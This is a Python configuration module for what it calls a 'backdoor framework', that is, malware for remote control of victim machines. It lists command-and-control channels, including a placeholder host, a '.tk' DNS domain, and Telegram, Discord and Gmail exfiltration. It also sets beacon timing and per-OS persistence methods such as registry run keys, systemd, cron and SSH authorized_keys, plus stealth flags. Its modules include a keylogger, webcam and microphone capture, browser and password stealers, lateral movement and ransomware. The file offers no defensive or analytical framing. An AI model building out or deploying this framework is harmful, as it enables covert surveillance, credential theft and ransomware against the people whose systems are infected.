"""
Configuration management for the backdoor framework.
"""
import hashlib
import platform
import getpass


class Config:
    """Central configuration class"""

    # Master key generation
    MASTER_KEY = hashlib.sha256(
        platform.node().encode() +
        str(platform.uname()).encode() +
        getpass.getuser().encode()
    ).digest()

    # C2 Servers (multiple for redundancy)
    C2_SERVERS = [
        {"protocol": "https", "host": "c2.example.com", "port": 443, "path": "/api/beacon"},
        {"protocol": "dns", "domain": "c2.malicious.tk"},
        {"protocol": "telegram", "bot_token": "YOUR_BOT_TOKEN", "chat_id": "YOUR_CHAT_ID"},
        {"protocol": "discord", "webhook": "https://discord.com/api/webhooks/xxx"},
        {"protocol": "gmail", "email": "backdoor.receiver@gmail.com", "app_password": "xxx"}
    ]

    # Beacon settings
    BEACON_INTERVAL = 30  # seconds
    JITTER = 0.3  # 30% jitter

    # Persistence methods
    PERSISTENCE = {
        "windows": [
            "registry_run",
            "scheduled_task",
            "service",
            "startup_folder",
            "wmi"
        ],
        "linux": [
            "cron",
            "systemd",
            "rc_local",
            "profile",
            "ssh_authorized_keys"
        ],
        "macos": [
            "launch_agent",
            "cron",
            "login_item"
        ]
    }

    # Stealth settings
    USE_ROOTKIT = False
    HIDE_PROCESS = True
    ENCRYPT_COMMS = True
    COMPRESS_DATA = True

    # Modules to load
    MODULES = [
        "shell",
        "file_manager",
        "keylogger",
        "screenshot",
        "webcam",
        "microphone",
        "browser_stealer",
        "password_dumper",
        "network_scanner",
        "privilege_escalation",
        "lateral_movement",
        "ransomware"  # Use with caution!
    ]